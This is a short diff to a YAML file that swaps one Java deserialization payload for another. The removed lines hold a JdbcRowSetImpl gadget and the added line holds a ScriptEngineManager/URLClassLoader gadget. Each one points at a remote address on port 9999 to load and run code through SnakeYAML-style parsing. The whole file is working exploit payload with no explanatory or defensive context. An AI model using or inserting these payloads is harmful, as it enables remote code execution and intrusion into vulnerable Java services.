@@ -1,5 +1,1 @@
-
-!!com.sun.rowset.JdbcRowSetImpl
-  dataSourceName: "http://188.131.187.191:9999/test"
-  autoCommit: true
-
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://188.131.187.191:9999/test"]]]]
